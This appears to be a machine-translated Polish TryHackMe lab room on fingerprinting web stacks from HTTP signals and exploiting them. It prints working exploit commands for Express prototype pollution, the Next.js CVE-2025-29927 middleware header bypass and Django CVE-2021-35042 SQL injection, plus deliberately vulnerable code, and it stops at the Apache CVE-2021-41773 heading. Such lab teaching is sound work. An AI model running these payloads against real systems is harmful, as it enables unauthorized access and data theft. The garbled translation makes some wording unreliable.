---

Podczas ograniczonego czasowo zadania testowego, pierwszy tester, który zidentyfikuje lukę `Apache/2.4.49`w `Server:`nagłówku, zna już dokładny kod CVE, zanim jego kolega z zespołu zakończy skanowanie portów. Drugi tester, oczekujący na wyniki skanowania, wciąż jest w trakcie rekonesansu. Odcisk palca stosu nie jest umiejętnością, którą warto posiadać. To bezpośredni czynnik zwiększający szybkość wykorzystywania luk.

Każdy stos sieciowy ujawnia swoją tożsamość. Nagłówki, nazwy plików cookie, komunikaty o błędach, struktura adresów URL i wzorce kodu źródłowego HTML – każdy z nich zawiera konkretne informacje o uruchomionym systemie. Znając stos i wersję, poznajesz powierzchnię ataku. Ogólne skanery podatności pomijają obejścia uwierzytelniania, które są zawarte w pojedynczej funkcji oprogramowania pośredniczącego. Pomijają one RCE, które wymaga zrozumienia protokołu deserializacji. Ręczne odciski palców, a następnie ukierunkowane badania CVE, to sposób działania doświadczonych zespołów red team.

Przebieg pracy dla każdego zadania w tym pokoju jest taki sam: identyfikacja stosu na podstawie obserwowalnych sygnałów, potwierdzenie wersji, zrozumienie, dlaczego istnieje podatny na ataki wzór kodu, a następnie wykonanie łańcucha exploitów.

**Trzyetapowy przepływ pracy stosowany jest do każdego zadania:**

1. Odcisk palca stosu na podstawie sygnałów odpowiedzi HTTP (jeszcze bez ładunków exploitów)
2. Potwierdź wersję i zidentyfikuj odpowiedni CVE
3. Wykonaj łańcuch exploitów i poznaj przyczynę źródłową

## Cele edukacyjne

Przed rozpoczęciem należy zapoznać się z poniższymi pomieszczeniami:

- Identyfikuj stos internetowy na podstawie pasywnych sygnałów HTTP (nagłówki, nazwy plików cookie, strony błędów, struktura adresu URL) bez wysyłania ładunków exploitów
- Wykorzystaj lukę CVE-2025-29927, aby ominąć uwierzytelnianie oprogramowania pośredniczącego Next.js
- Wykorzystaj lukę CVE-2021-35042, aby wyodrębnić zawartość bazy danych z aplikacji Django 
- Wykorzystaj lukę CVE-2021-41773 do odczytu dowolnych plików i wykonywania poleceń systemowych za pośrednictwem `mod_cgi`Apache 2.4.49

## Wymagania wstępne

Przed rozpoczęciem należy zapoznać się z poniższymi pomieszczeniami:

- [HTTPszczegółowo](https://tryhackme.com/room/httpindetail)
- [Powłoki Linuksa](https://tryhackme.com/room/linuxshells)
- [Podstawy sieciowania](https://tryhackme.com/room/networkingessentials)

## Dostęp do maszyny

Docelową maszyną jest maszyna wirtualna Ubuntu 22.04 uruchamiająca cztery usługi: port `3000`(MERN/Express), port `3001`(Next.js/RSC), port `8000`(Django) i port `8080`(Apacz2.4.49 w Dockerzepojemnik). Do wszystkich czterech portów można dotrzeć z poziomu AttackBox poprzez połączenie typu split-view.

MERN aplikacje są wszędzie. Stos ( **MongoDB, Express.js, React, Node.js** ) obsługuje znaczną część nowoczesnych Oprogramowanie jako usługa produkty, narzędzia wewnętrzne i APIbackendy. Express jest zdecydowanie najczęściej wdrażanym frameworkiem internetowym Node.js, a jego minimalistyczny charakter oznacza, że ​​programiści piszą dużo własnego kodu narzędziowego. To właśnie w tym kodzie narzędziowym często kryją się luki w zabezpieczeniach.

## Tożsamość stosu

MERN aplikacje są domyślnym wyborem dla sklepów obsługujących wyłącznie JavaScript, które chcą korzystać z jednego języka w całym stosie. W Ubuntu typowe wdrożenie to Node.js z NodeSource PPA, Express nasłuchujący na porcie `3000`lub `5000`oraz MongoDB na porcie `27017`. Odwrotny serwer proxy (zazwyczaj Nginx) działa na pierwszym planie w środowisku produkcyjnym, ale w źle skonfigurowanych środowiskach i narzędziach wewnętrznych proces Express jest często bezpośrednio widoczny.

## Odcisk palca stosu MERN

Zanim zaczniesz korzystać z jakichkolwiek exploitów, zidentyfikuj, z czym masz do czynienia. Zacznij od sprawdzenia nagłówka:

Terminal

```shell-session
root@tryhackme:~# curl -I MACHINE_IP:3000/
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 68
ETag: W/"44-0T374IjVuBCKvVq78aQtpBIvD2A"
Set-Cookie: connect.sid=s%3A2PyC5xblQ3G0ERkE60uOUddRtPs2jacn.0gAB6ByfrNg3b48tDXARTEBQG0pLlKkBofAsa69W%2FY0; Path=/; HttpOnly
Date: Sun, 03 May 2026 15:00:23 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

W odpowiedzi należy szukać następujących elementów:

|Sygnał|Wartość|Zaufanie|
|---|---|---|
|`X-Powered-By`chodnikowiec|`Express`|Wysoki|
|`Set-Cookie`chodnikowiec|`connect.sid=s%3A...`|Wysoki|
|Nieobsłużona odpowiedź trasy|`Cannot GET /nonexistent` (zwykły tekst)|Wysoki|
|Element główny front-endu|W treści HTML|Średni|

`X-Powered-By: Express`to sygnał podstawowy. Express domyślnie wysyła ten nagłówek w każdej odpowiedzi. Jest on nieobecny tylko wtedy, gdy programista jawnie wywołał `app.disable('x-powered-by')`lub dodał oprogramowanie pośredniczące Helmet. Większość programistów nie zawraca sobie tym głowy. Odwrotne serwery proxy i platformy PaaS (Vercel, Cloudflare, Railway) często usuwają ten nagłówek, zanim dotrze on do klienta. Jeśli `X-Powered-By`jest nieobecny, należy użyć nazwy pliku cookie i formatu nieobsługiwanej trasy jako sygnałów drugorzędnych.

Plik `connect.sid`cookie pochodzi z oprogramowania `express-session`pośredniczącego. Jest obecny, gdy aplikacja korzysta `express-session`z `saveUninitialized: true`(domyślnie dla wielu aplikacji). W przypadku `saveUninitialized: false`, zalecanego ustawienia dla sesji logowania, plik cookie pojawia się dopiero po utworzeniu sesji. Brak `connect.sid`nie wyklucza Express.

![](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** Jeśli `saveUninitialized: false`jest skonfigurowany (domyślnie w nowszej dokumentacji Express-Sesion dla sesji tylko z logowaniem), plik cookie jest nieobecny w przypadku żądań nieuwierzytelnionych. Brak pliku cookie `connect.sid`nie potwierdza braku Express.

Aby potwierdzić odcisk palca nieobsłużonej trasy Express, poproś terminal AttackBox o nieistniejącą ścieżkę:

Terminal

```shell-session
root@tryhackme:~# curl http://MACHINE_IP:3000/nonexistent
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /nonexistent</pre>
</body>
</html>
```

Aplikacja Express z domyślnymi ustawieniami zwraca zwykły tekst: `Cannot GET /nonexistent`. Różni się to od Django (który wyświetla stronę błędu HTML), Apache (który wyświetla stylizowany kod 403 lub 404) i Next.js (który zwraca stronę HTML ze stylizowanym błędem). Ta odpowiedź w postaci zwykłego tekstu jest jednoznaczna.

## Wykorzystanie MERN

Potwierdzono stos: Express na porcie `3000`z `connect.sid`plikiem cookie sesji. W teście penetracyjnym aplikacji MERN, kolejnym krokiem po odcisku palca jest enumeracja powierzchni API. Aplikacje MERN często udostępniają interfejsy API JSON do aktualizacji profili, preferencji i ustawień użytkownika, a programiści często piszą własne funkcje narzędziowe, aby stosować częściowe aktualizacje obiektów użytkownika. To właśnie te funkcje narzędziowe zazwyczaj powodują zanieczyszczenie prototypów.

Aplikacja na porcie `3000`udostępnia dwa punkty końcowe istotne dla tego zadania:

|Punkt końcowy|Metoda|Zamiar|
|---|---|---|
|`/api/user/update`|POST|Akceptuje dane JSON i łączy je z obiektem użytkownika sesji|
|`/api/admin/flag`|DOSTAWAĆ|Zwraca flagę, jeśli żądający użytkownik ma dostęp administratora|

Zacznij od potwierdzenia, że ​​ścieżka administracyjna jest zablokowana. Najpierw zapisz plik cookie sesji, a następnie przeskanuj chroniony punkt końcowy, wydając następujące polecenia:

Terminal

```shell-session
root@tryhackme:~# curl -c cookies.txt http://MACHINE_IP:3000/
MERN Lab App
root@tryhackme:~# curl -b cookies.txt http://MACHINE_IP:3000/api/admin/flag
{"error":"Not authorized"}
```

Oczekiwane: `{"error":"Not authorized"}`. Sprawdzanie działa dla zwykłych użytkowników sesji, którzy mają `isAdmin`nieruchomość.

Teraz spójrz, co punkt końcowy aktualizacji akceptuje w normalnych warunkach. Prawdziwy klient może wysłać zmianę nazwy lub adresu e-mail:

Terminal

```shell-session
root@tryhackme:~# curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update -H "Content-Type: application/json" -d '{"name": "Alice", "email":"alice@example.com"}'
{"status":"updated"}
```

Oczekiwane: `{"status":"updated"}`. Punkt końcowy akceptuje dowolne klucze JSON i scala je z obiektem użytkownika bez filtrowania kluczy. Ta funkcja scalająca stanowi powierzchnię ataku.

Każdy obiekt JavaScript dziedziczy ze współdzielonego elementu głównego o nazwie `Object.prototype`. Gdy funkcja scalania otrzymuje klucz `{"proto": {"isAdmin": true}}`bez filtrowania `proto`, zapisuje go `isAdmin: true`bezpośrednio do `Object.prototype`, a nie do żadnego indywidualnego obiektu użytkownika. Każdy obiekt w procesie Node.js, który go wyszukuje,  `.isAdmin`znajdzie go `true`za pośrednictwem łańcucha prototypów, nawet jeśli właściwość nigdy nie została jawnie ustawiona dla tego obiektu. Punkt końcowy flagi administratora sprawdza `currentUser.isAdmin`zwykły obiekt sesji bez własnej `isAdmin`właściwości, co czyni go dokładnym celem. Niektóre wdrożenia o wzmocnionym zabezpieczeniu filtrują `__proto__`na poziomie warstwy wejściowej; w takich przypadkach `constructor.prototype`ścieżka ( `{"constructor": {"prototype": {"isAdmin": true}}}`) prowadzi `Object.prototype`inną trasą i może ominąć te filtry. Więcej informacji na temat pokoju poświęconego zanieczyszczeniu prototypów można znaleźć w sekcji [„Prototype Pollution”](https://tryhackme.com/room/prototypepollution) .

## Uzyskiwanie flagi administratora

Funkcja scalania podatna na ataki w aplikacji wygląda następująco:

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

Gdy ładunek `{"__proto__": {"isAdmin": true}}`dociera do tej funkcji, wyszukuje `__proto__`klucze źródłowe, uznaje je za obiekt i wykonuje rekursję. Wewnątrz rekursji `target["__proto__"]`znajduje się odwołanie do `Object.prototype`klucza innego niż standardowy, więc ustawia wartość `Object.prototype.isAdmin = true`. Następnie ścieżka administracyjna odczytuje wartość `currentUser.isAdmin`, nie znajduje własnej właściwości, przechodzi przez łańcuch prototypów i zwraca flagę.

```javascript
app.get('/api/admin/flag', (req, res) => {
  const currentUser = req.session.currentUser || {};
  if (currentUser.isAdmin) {               // resolves true via prototype chain
    res.json({ flag: '[REDACTED]' });
  } else {
    res.status(403).json({ error: 'Not authorized' });
  }
});
```

**Krok 1: Wyślij prototyp ładunku zanieczyszczenia**

Terminal

```shell-session
root@tryhackme:~# curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'
{"status":"updated"}
```

Serwer odpowiada: `{"status":"updated"}`. Scalenie zostało wykonane i proces Node.js `Object.prototype.isAdmin`jest teraz w toku.`true`

**Krok 2: Poproś o flagę administratora**

Terminal

```shell-session
root@tryhackme:~# curl -b cookies.txt http://MACHINE_IP:3000/api/admin/flag
{"flag":"[REDACTED]"}
```

Sprawdzenie `isAdmin`odbywa się `true`poprzez łańcuch prototypów, a odpowiedź zawiera flagę.

To jedna z wielu technik, które można wykorzystać do eksploatacji nowoczesnych stosów internetowych.

Express jest podstawąMERNStos, który właśnie wykorzystaliśmy. Next.js bazuje na nim, dodając abstrakcje, takie jak App Router, komponenty React Server i oprogramowanie pośredniczące, które tworzą inną, bardziej poważną powierzchnię ataku.

## Tożsamość stosu

**Next.js** to dominujący framework **React** dla aplikacji produkcyjnych. To właśnie on znajduje się w większości paneli inwestorskich, portali klientów i witryn marketingowych stworzonych w ciągu ostatnich trzech lat. W Ubuntu działa jako proces Node.js z dedykowanym użytkownikiem ( `node`lub ), zazwyczaj uruchamiany po . Router aplikacji (wprowadzony w Next.js 13, domyślny od wersji 14) włącza komponenty React Server, co powoduje, że luki [CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)`www-data` są nieaktualne.`npm start``npm run build`[(otwiera się w nowej karcie)](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)i [CVE-2025-55182(otwiera się w nowej karcie)](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)możliwy.

![](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** Zarówno CVE-2025-29927, jak i CVE-2025-55182 dotyczą aplikacji Next.js w trybie produkcyjnym ( `npm run build && npm start`). Nie pojawiają się w trybie programistycznym ( `next dev`). Jeśli odcisk palca potwierdzi serwer programistyczny, żaden z CVE nie ma zastosowania.

## Komponenty serwera React i protokół Flight

Router aplikacji uruchamia komponenty React bezpośrednio na serwerze. Zamiast wysyłać JavaScript do przeglądarki, serwer wykonuje komponent i przesyła strumieniowo wynik do klienta w formacie podobnym do binarnego, zwanym protokołem RSC Flight. Ten kanał strumieniowy, punkt końcowy obsługujący ten ładunek, stanowi powierzchnię ataku dla luki CVE-2025-55182.

## Odcisk palca Next.js

Zacznij od pasywnego odcisku palca. Na razie nie ma żadnych ładunków exploitujących.

Terminal

```shell-session
root@tryhackme:~# curl -I http://10.129.151.247:3001/
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000,
ETag: "1pqu4ojvif3at"
Content-Type: text/html; charset=utf-8
Content-Length: 4277
Connection: keep-alive
Keep-Alive: timeout=5 
```

Po wykonaniu tej czynności należy poszukać następujących wzorców:

|Sygnał|Wartość|Zaufanie|
|---|---|---|
|`X-Powered-By`chodnikowiec|`Next.js`|Wysoki|
|Źródło HTML|`window.__next_f`  w `script`tagu|Wysoki (potwierdza App Router)|
|Ścieżki zasobów statycznych|`/_next/static/chunks/`|Wysoki|
|Nagłówki oprogramowania pośredniczącego|`x-middleware-next`Lub`x-middleware-rewrite`|Średni|
|Przekieruj do chronionej trasy|HTTP 307 do`/login`|Średni|

`window.__next_f`W kodzie źródłowym strony znajduje się ostateczny wskaźnik App Router. Jest to tablica hydratacji danych komponentu React Server, wstrzykiwana przez Next.js do wyjścia HTML każdej strony App Router. Nie pojawia się on w Pages Router ani żadnym innym frameworku.

## CVE-2025-29927: Obejście oprogramowania pośredniczącego

W Next.js oprogramowanie pośredniczące to funkcja uruchamiana przed dotarciem każdego żądania do strony. Programiści używają go jako centralnego strażnika; weryfikacja uwierzytelnienia, walidacja sesji i logika przekierowań znajdują się właśnie tutaj. Ponieważ oprogramowanie pośredniczące znajduje się przed każdą ścieżką, jest to najczęstsze miejsce, w którym programiści implementują kontrolę dostępu w aplikacjach Next.js.

Trasa `/dashboard`w tej aplikacji jest typowym przykładem. Oprogramowanie pośredniczące sprawdza poprawność pliku cookie sesji. Bez niego przekierowuje do `/login`. Sprawdźmy, czy działa:

Terminal

```shell-session
root@tryhackme:~# curl -v http://10.129.151.247:3001/dashboard
Trying 10.129.151.247:3001...
Connected to 10.129.151.247 port 3001
GET /dashboard HTTP/1.1
Host: 10.129.151.247:3001
Accept: /
/login 
```

Oprogramowanie pośredniczące działa. Bez plików cookie, bez pulpitu nawigacyjnego, serwer kieruje nas bezpośrednio do `/login`.

Teraz o luce w zabezpieczeniach. Next.js używa wewnętrznego nagłówka, który `x-middleware-subrequest`zapobiega powstawaniu nieskończonych pętli. Gdy middleware wywołuje sam siebie rekurencyjnie (na przykład, aby przekazać zmodyfikowane żądanie na inną trasę), Next.js dołącza ten nagłówek, aby wiedzieć, że nie należy ponownie uruchamiać middleware dla tego przekazanego żądania. Jest to mechanizm wydajności i bezpieczeństwa wbudowany w sam framework.

Krytyczna wada: Next.js nigdy nie sprawdzał, czy `x-middleware-subrequest`nagłówek pochodzi z procesu wewnętrznego, czy z zewnętrznego klienta. Jeśli dołączysz nagłówek do własnego żądania, Next.js traktuje go jak wewnętrzne podżądanie i całkowicie pomija oprogramowanie pośredniczące. Sprawdzanie uwierzytelnienia nigdy się nie uruchamia.

Wartość nagłówka koduje ścieżkę do modułu middleware, powtórzoną pięć razy. W przypadku aplikacji z plikiem głównym `middleware.ts`:

Terminal

```shell-session
root@tryhackme:~# curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://10.129.151.247:3001/dashboard
...
DashboardFlag: [REDACTED]
...
```

Kontrola oprogramowania pośredniczącego jest całkowicie pomijana. Żądanie jest kierowane bezpośrednio do modułu obsługi strony pulpitu nawigacyjnego, który zwraca flagę.

To jest CVE-2025-29927, krytyczny błąd CVSS 9.1. Każda aplikacja Next.js, która korzystała z oprogramowania pośredniczącego do uwierzytelniania, była narażona na całkowite ominięcie uwierzytelniania za pomocą jednego nagłówka. Bez poświadczeń, bez ataku siłowego, bez tokena sesji, tylko wartość nagłówka, której sam Next.js ufał bez walidacji.

![](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/68d2c1e7ab94268f6271de1d-1771765216406)

**Informacja:** Jeśli aplikacja korzysta ze `/src`struktury katalogów, wartość nagłówka zmienia się na `src/middleware`powtórzoną pięć razy. Zawsze sprawdzaj, czy `middleware.ts`znajduje się w katalogu głównym projektu, czy w `src/`.

**CVE-2025-55182: Ćwicz w wydzielonym pomieszczeniu**

CVE-2025-55182 to nieuwierzytelniony atak RCE spowodowany niebezpieczną deserializacją w parserze protokołu RSC Flight. Dotyczy on Next.js 14 (>= 14.3.0-canary.77) i Next.js 15.x (< 15.2.3) w połączeniu z React 19, nie wymaga uwierzytelniania i ma wynik CVSS 10,0 krytyczny. Jackpot Panda rozszerzył się z początkowego `id`/ `whoami`rozpoznawczego na kradzież danych uwierzytelniających i etapowanie Cobalt Strike w ramach tej samej fali ataków.CVE-2025-29927.

Tutaj znajdziesz specjalne pomieszczenie z pełnym przewodnikiem po exploitach, analizą ładunku uzbrojonego i informacjami o wykryciu:[CVE-2025-55182: React2Shell](https://tryhackme.com/room/react2shellcve202555182) .

W tym pomieszczeniu szczegółowo omówiono lukę w deserializacji protokołu Flight, przedstawiono łańcuch wykorzystania luk od badania do wykonania polecenia oraz przedstawiono perspektywę wykrywania i naprawiania, która wykracza poza zakres tego zadania skupionego na odciskach palców.

Ten MERN i stosy Next.js, z którymi pracowałeś, działają na Node.js. **Django** to alternatywny framework natywny dla Pythona, z którego korzystają agencje rządowe, redakcje iOprogramowanie jako usługaFirmy z zespołami inżynierów Pythona sięgają po pierwsze.ORMma chronić programistów przedSQLWstrzyknięcie. W przypadku większości zapytań tak. Ale gdy programiści pomijająORMi łączyć dane wejściowe użytkownika bezpośrednio zSQLlub kiedyORMsama w sobie ma wadę w postaci przestarzałej ścieżki kodu, baza danych jest otwarta.

[CVE-2021-35042(otwiera się w nowej karcie)](https://nvd.nist.gov/vuln/detail/CVE-2021-35042)jestSQLpodatność na wstrzyknięcie luki w metodzie zapytania Django `order_by()`, oceniona **jako krytyczna przez CVSS 9.8** i nie wymagająca uwierzytelniania, aby ją wykorzystać.

## Tożsamość stosu

Django napędza znaczną część aplikacji internetowych opartych na Pythonie. W systemie Ubuntu działa pod kontrolą Gunicorn lub wbudowanego serwera deweloperskiego Django, zazwyczaj na porcie `8000`. Panel administracyjny Django `/admin/`i oprogramowanie pośredniczące CSRF są domyślnie włączone w praktycznie każdym projekcie Django. Sam panel administracyjny stanowi niezawodny sygnał stosu przed wysłaniem pojedynczego ładunku exploita.

## Odcisk palca Django

Zacznij od sprawdzenia nagłówka działającej aplikacji:

Terminal

```shell-session
root@tryhackme:~# curl -I "http://10.82.95.115:8000/products/"
HTTP/1.1 200 OK
Date: Sun, 03 May 2026 14:33:20 GMT
Server: WSGIServer/0.2 CPython/3.10.12
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 407
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  csrftoken=9vMaeHlURA0uOYnP9qB2BrDNTvNPoD0JPyecxWNxV7aohswgtAtBvwbLWaOTYIF7; expires=Sun, 02 May 2027 14:33:20 GMT; Max-Age=31449600; Path=/; SameSite=Lax
```

Po wykonaniu tej czynności należy poszukać następujących wzorców:

|Sygnał|Wartość|Zaufanie|
|---|---|---|
|`Server`chodnikowiec|`WSGIServer/0.2 CPython/X.X.X`|Wysoki|
|`Cookie`nazwa|`csrftoken`|Wysoki|
|`X-Frame-Options`chodnikowiec|`DENY`|Wysoki|
|`X-Content-Type-Options`chodnikowiec|`nosniff`|Wysoki|
|`Referrer-Policy`chodnikowiec|`same-origin`|Średni|
|Źródło HTML (dowolny `POST`formularz)|`csrfmiddlewaretoken`ukryte pole|Wysoki|

Ukryte `csrfmiddlewaretoken`pole to najbardziej niezawodny odcisk palca Django. Django automatycznie `CsrfViewMiddleware`wstrzykuje je do każdego `POST`formularza. Przejdź do `/admin/`źródła i wyświetl je; jest ono zawsze dostępne. Nie znajdziesz tego pola w Express, Rails ani żadnej aplikacji Next.js.

Połączenie `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, i `Referrer-Policy: same-origin`występujące razem sygnalizuje Django `SecurityMiddleware`. Żaden inny framework nie stosuje tej kombinacji domyślnie.

**Aplikacja: Katalog produktów**

Aplikacja działająca na porcie `8000`to prosty katalog produktów. Przejdź do, `/products/`aby zobaczyć, z czym mamy do czynienia:

Terminal

```shell-session
root@tryhackme:~# curl -s "http://MACHINE_IP:8000/products/"
<!DOCTYPE html>
<html>
<head><title>Products</title></head>
<body>
<h1>Products</h1>
<form method="get" action="">
  <input type="hidden" name="csrfmiddlewaretoken" value="w4VrwSsqEYpBZL4ROD1c4CgYbqw0zjZZeiXQVYGmkUjVDIce9k6wq7XvaORkbAkL">
  <input type="hidden" name="order" value="">
</form>
<ul>

  <li>Gadget B - $19.99</li>

  <li>Tool C - $4.99</li>

  <li>Widget A - $9.99</li>

</ul>
</body>
</html>
```

Dwie rzeczy się wyróżniają. Po pierwsze, mamy `csrfmiddlewaretoken`Django potwierdzające. Po drugie, w formularzu jest `order`parametr; użytkownik kontroluje kolumnę sortowania. Ten parametr to nasz punkt wstrzyknięcia.

## CVE-2021-35042: Luka w zabezpieczeniach

Widok obsługujący `/products/`buduje zapytanie SQL poprzez łączenie `order`parametru bezpośrednio z `ORDER BY`klauzulą:

```python
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
)
```

Cokolwiek wprowadzisz, `?order=`trafi do gałęzi `THEN`kodu SQL bez walidacji. `CASE WHEN`Struktura jest zawsze prawdziwa (1=1), więc `THEN`gałąź zawsze zostanie wykonana, co czyni ją punktem wejścia do wstrzykiwania.

Technika ta `updatexml()`wykorzystuje sposób, w jaki MySQL obsługuje błędy XPath. `updatexml(1, xpath_expr, 1)`Zgłasza błąd, jeśli wyrażenie XPath jest nieprawidłowe. Poprzez umieszczenie `SELECT`argumentu XPath w `concat(0x7e, ...)`, MySQL uwzględnia wynik zapytania w komunikacie o błędzie. `0x7e`to wartość szesnastkowa dla `~`, która działa jak ogranicznik, ułatwiając identyfikację wyodrębnionej wartości. Tryb debugowania Django (DEBUG = True) wyświetla te błędy MySQL w treści odpowiedzi HTTP 500.

![](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/68d2c1e7ab94268f6271de1d-1771765214579)

**Ostrzeżenie:** Ta `updatexml()`technika działa tylko wtedy, gdy `DEBUG = True`jest ustawiona w `settings.py`. Aplikacja produkcyjna `DEBUG = False`zwraca ogólną stronę 500 bez szczegółów błędów. W tym laboratorium ustawienie debugowania jest włączone, ale w rzeczywistym środowisku należy to najpierw zweryfikować. Jeśli dane wyjściowe debugowania są tłumione, rozwiązaniem awaryjnym jest wstrzykiwanie oparte na ślepym czasie `SLEEP()`.

## Przewodnik po eksploatacji

**Krok 1: Wyodrębnij wersję MySQL**

Potwierdź działanie wstrzykiwania, wyodrębniając znaną wartość: wersję bazy danych. `@@version`Zmienna systemowa jest zawsze dostępna i natychmiast potwierdza, że ​​ładunek jest wykonywany. Odpowiedź błędu 500 ujawnia również wersję Django w wynikach debugowania:

Terminal

```shell-session
root@ip-10-82-126-238:~# curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
~8.0.45-0ubuntu0.22.04.1
```

Prefiks `~`potwierdza wykonanie ładunku i odpowiedź bazy danych. Wstrzykujesz dane do MySQL 8.0. Ta sama strona błędu 500 znajduje się również `Django Version: 3.2.4`w wynikach debugowania.

**Krok 2: Wyodrębnij nazwę bazy danych**

Teraz sprawdź, z której bazy danych korzysta aplikacja:

Terminal

```shell-session
root@ip-10-82-126-238:~# curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
~vuln_db
```

Docelowa baza danych to `vuln_db`. To tylko przykład, a te informacje możemy przekazać takim narzędziom jakSqlmapw celu dalszego wykorzystania i zniszczenia bazy danych.

LAMPA(Linux,Apacz, MySQL,PHP) to jeden z najwcześniejszych i najpowszechniej stosowanych pakietów aplikacji internetowych. Zyskał popularność, ponieważ wszystkie jego komponenty są oparte na otwartym kodzie źródłowym, stabilne i łatwe we wdrożeniu.Linuxzapewnia system operacyjny,Apaczobsługuje żądania internetowe, MySQL zarządza bazą danych iPHPPrzetwarza dynamiczną zawartość. Przez lata napędzał znaczną część internetu, w tym blogi, fora i aplikacje korporacyjne. Nawet dziś wiele starszych systemów i środowisk produkcyjnych nadal opiera się naLAMPAze względu na swoją prostotę i niezawodność.

## Tożsamość stosu

W systemie Ubuntu Apacz zwykle działa pod `www-data`, obsługuje pliki z `/var/www/html,`i przekazuje dynamiczne żądania do PHP przez `mod_php`lub PHP-FPM. MySQL przechowuje dane aplikacji, podczas gdy PHP obsługuje logikę po stronie serwera. Ten klasyczny Linux, Apache, MySQL i PHP połączenie tworzy wspólne powierzchnie ataku, takie jak odsłonięte PHP pliki, błędy bazy danych, słabe uprawnienia plików i nieprawidłowo skonfigurowany Apache/PHP ustawienia.

## Odcisk palca stosu LAMP

Zacznij od sprawdzenia nagłówka. Apache reklamuje swoją wersję w każdej odpowiedzi:

Terminal

```shell-session
root@tryhackme:~# curl -I http://10.130.164.251:8080/
HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)
Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
ETag: "2d-432a5e4a73a80"
Accept-Ranges: bytes
Content-Length: 45
Content-Type: text/html
```

`Server: Apache/2.4.49 (Unix)`To wszystko, czego potrzebujesz. Ta konkretna wersja jest powiązana z [CVE-2021-41773.(otwiera się w nowej karcie)](https://nvd.nist.gov/vuln/detail/cve-2021-41773)i nic więcej.ApaczPowtarza również wersję w stopkach stron błędu 404. Poproś o nieistniejącą ścieżkę, aby potwierdzić:

Terminal

```shell-session
root@tryhackme:~# curl -v http://10.130.164.251:8080/nonexistent 2>&1
*   Trying 10.130.164.251:8080...
* TCP_NODELAY set
* Connected to 10.130.164.251 (10.82.95.115) port 8080 (#0)
> GET /nonexistent HTTP/1.1
> Host: 10.130.164.251:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Date: Sat, 02 May 2026 21:16:56 GMT
< Server: Apache/2.4.49 (Unix)
< Content-Length: 196
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
* Connection #0 to host 10.130.164.251 left intact
```

Ostatni sygnał to `/cgi-bin/`. Kod 403 Forbidden oznacza, że ​​katalog istnieje, a lista jest wyłączona. `mod_cgi`Jest skonfigurowany. Kod 404 oznaczałby, że katalog w ogóle nie istnieje. W przypadku tego exploita `mod_cgi`wymagane jest:

Terminal

```shell-session
root@tryhackme:~# curl -v http://10.130.164.251:8080/cgi-bin/ 2>&1
*   Trying 10.82.95.115:8080...
* TCP_NODELAY set
* Connected to 10.130.164.251 (10.82.95.115) port 8080 (#0)
> GET /cgi-bin/ HTTP/1.1
> Host: 10.130.164.251:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Date: Sat, 02 May 2026 21:19:21 GMT
< Server: Apache/2.4.49 (Unix)
< Content-Length: 199
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
* Connection #0 to host 10.130.164.251 left intact
```

Po wykonaniu tej czynności należy poszukać następujących wzorców:

|Sygnał|Wartość|Zaufanie|
|---|---|---|
|`Server`chodnikowiec|Apache/2.4.49 (Unix)|Wysoki – dokładne dopasowanie CVE|
|Stopka strony błędu 404|Ciąg wersji Apache/2.4.49|Wysoki|
|`/cgi-bin/`odpowiedź|403 Zabronione (nie 404)|Wysoki - `mod_cgi`włączony|

## CVE-2021-41773: Luka w zabezpieczeniach

